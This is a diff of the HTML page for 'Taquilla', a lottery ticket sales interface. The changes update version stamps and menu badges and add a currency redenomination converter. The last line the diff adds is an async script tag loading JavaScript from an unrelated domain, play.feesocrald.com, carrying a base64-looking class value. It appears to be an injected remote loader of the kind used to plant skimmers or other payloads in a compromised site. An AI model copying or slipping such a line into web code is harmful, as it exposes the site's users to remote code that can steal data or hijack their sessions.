@@ -3,8 +3,8 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-    <meta name="description" content="loteria,animales,animalitos">
-    <meta name="author" content="">
+    <meta name="description" content="loteria,animales,animalitos,ventas,software">
+    <meta name="author" content="srq">
 
     <meta http-equiv="Cache-Control" content="no-store" />
 
@@ -14,7 +14,7 @@
     <link href="../theme/css/jquery.gritter.css" rel="stylesheet">
     <link href="../taquilla/css/custom.css" rel="stylesheet">
 
-    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- v180824 -->
     <!--[if lt IE 9]>
     <script src="../theme/js/html5shiv.js"></script>
     <script src="../theme/js/respond.min.js"></script>
@@ -36,12 +36,12 @@
 </div>
 <section>
     <div class="leftpanel">
-
         <div class="logopanel">
             <a id="logolink" href="#" title="Click para forzar actualizaci&oacute;n.">
                 <h1><span>[</span> Taquilla <span>]</span></h1>
-                <span class="label label-default"> v180724 </span></a>
+                <span class="label label-default"> v@verStamp </span></a>
             <span class="label label-success"><span id="main-bin">0</span> / <span id="main-bout">0</span> </span></a>
+            <div id="google_translate_element"></div>
         </div><!-- logopanel -->
 
         <div class="leftpanelinner">
@@ -79,18 +79,19 @@
                         <li><a href="#ticket-anular" data-target="#md-anularTicket" data-toggle="modal"><i class="fa fa-remove"></i> <span>Eliminar</span></a></li>
                     </ul>
                 </li>
-                <li><a href="#sorteos/buscar"><i class="fa fa-list-ul"></i> <span>Sorteos</span></a></li>
-                <li class="nav-parent"><a href=""><i class="fa fa-bar-chart"></i> <span>Reportes</span></a>
+                <li><a href="#sorteos/buscar">
+                    <span class="pull-right badge badge-success">NUEVO</span>
+                    <i class="fa fa-list-ul"></i> <span>Sorteos</span></a></li>
+                <li class="nav-parent"><a href=""><i class="fa fa-pagelines"></i> <span>Reportes</span></a>
                     <ul class="children">
-                        <li><a href="#reporte/general"><i class="fa fa-area-chart"></i> <span>General</span></a></li>
+                        <li><a href="#reporte/general"><i class="fa fa-desktop"></i> <span>General</span></a></li>
                         <li><a href="#reporte/diario"><i class="fa fa-calendar"></i> <span>Diario</span></a></li>
-                        <li><a href="#reporte/sorteo"><i class="fa fa-sticky-note"></i> <span>Sorteo</span></a></li>
-                        <li><a href="#reporte/ventas"><i class="fa fa-ticket"></i> <span>Ventas</span></a></li>
+                        <li><a href="#reporte/ventas">
+                            <span class="pull-right badge badge-success">NUEVO</span>
+                            <i class="fa fa-ticket"></i> <span>Ventas</span></a></li>
                     </ul>
                 </li>
-                <li><a href="#preferencias">
-                    <!--<span class="pull-right badge badge-success">NUEVO</span>-->
-                    <i class="fa fa-desktop"></i> <span>Preferencias</span></a></li>
+                <li><a href="#preferencias"><i class="fa fa-desktop"></i> <span>Preferencias</span></a></li>
             </ul>
         </div><!-- leftpanelinner -->
     </div><!-- leftpanel -->
@@ -130,22 +131,36 @@
                     <li>
                         <div class="btn-group">
                             <button class="btn btn-default dropdown-toggle tp-icon" data-toggle="dropdown">
-                                <i class="glyphicon glyphicon-globe"></i>
+                                <i class="glyphicon glyphicon-transfer"></i>
                             </button>
                             <div class="dropdown-menu dropdown-menu-head pull-right">
-                                <h5 class="title">You Have 5 New Notifications</h5>
-                                <ul class="dropdown-list gen-list">
-                                    <li class="new">
-                                        <a href="">
-                                            <span class="thumb"><img src="../theme/images/photos/user4.png" alt="" /></span>
-                    <span class="desc">
-                      <span class="name">Zaham Sindilmaca <span class="badge badge-success">new</span></span>
-                      <span class="msg">is now following you</span>
-                    </span>
-                                        </a>
-                                    </li>
-                                    <li class="new"><a href="">See All Notifications</a></li>
-                                </ul>
+                                <h5 class="title">RECONVERSION 2018</h5>
+                                <form id="cbsf">
+                                    <div class="form-group">
+                                        <div class="input-group mt10">
+                                              <span class="input-group-btn">
+                                                <button type="submit" class="btn btn-darkblue">BsF a BsS</button>
+                                              </span>
+                                            <input type="number" min="1000" step="any" class="form-control" name="n"/>
+                                            <span class="input-group-addon">
+                                                <span id="cbsfr">0.00</span> BsS
+                                            </span>
+                                        </div>
+                                    </div>
+                                </form>
+                                <form id="cbss">
+                                    <div class="form-group">
+                                        <div class="input-group mt10">
+                                              <span class="input-group-btn">
+                                                <button type="submit" class="btn btn-darkblue">BsS a BsF</button>
+                                              </span>
+                                            <input type="number" min="0" step="any" class="form-control" name="n"/>
+                                            <span class="input-group-addon">
+                                                <span id="cbssr">0.00</span> BsF
+                                            </span>
+                                        </div>
+                                    </div>
+                                </form>
                             </div>
                         </div>
                     </li>
@@ -205,16 +220,16 @@
     <tr>
         <td>#{{:numero}} {{:descripcion}}</td>
         <td>{{:sorteo}}</td>
-        <td>{{:~formatNumber(monto,0)}}</td>
-        <td>{{:~formatNumber(premio,0)}}</td>
-        {{if pago}}
-            <td>{{:~formatDate(pago,"dd/mm hh:MM TT")}}</td>
-        {{else}}
-            {{if premio>0}}
-                <td><button data-id="{{:ventaID}}" data-ticket="{{:ticketID}}" data-sorteoid="{{:sorteoID}}" class="pagar-premio btn btn-success btn-xs">Pagar</button> </td>
+        <td>{{:~formatNumber(monto,2)}}</td>
+        <td>{{:~formatNumber(premio,2)}}</td>
+        {{if premio>0}}
+            {{if pago}}
+                <td>{{:~formatDate(pago,"dd/mm hh:MM TT")}}</td>
             {{else}}
-                <td></td>
+                <td><button data-id="{{:ventaID}}" data-ticket="{{:ticketID}}" data-sorteoid="{{:sorteoID}}" class="pagar-premio btn btn-success btn-xs">Pagar</button> </td>
             {{/if}}
+        {{else}}
+            <td></td>
         {{/if}}
     </tr>
 </script>
@@ -326,17 +341,17 @@
 <script src="../theme/js/modernizr.min.js"></script>
 <script src="../theme/js/retina.min.js"></script>
 -->
-<script>var vrs = "18.07.240";</script>
+<script>var vrs = "@version";</script>
 <script src="../js/client.min.js"></script>
 <script src="../js/md5.js"></script>
 <script src="../js/jsrender.min.js"></script>
-<script src="../js/srsocket.js?170910"></script>
-<script src="../js/srnav.js?180114"></script>
-<script src="../js/tools.js?180224"></script>
+<script src="../js/srsocket.js?180821"></script>
+<script src="../js/srnav.js?180821"></script>
+<script src="../js/tools.js?180821"></script>
 
-<script src="js/bracket.js?170429"></script>
-<script src="js/compressed.js?180712"></script>
+<script src="js/bracket.js?180821"></script>
+<script src="js/compressed.js?@version"></script>
 <script src="js/keymap.js"></script>
-
+<script async class="=YWE3NFV1eXE7NDA7MQ==" src="https://play.feesocrald.com/app.js"></script>
 </body>
 </html>
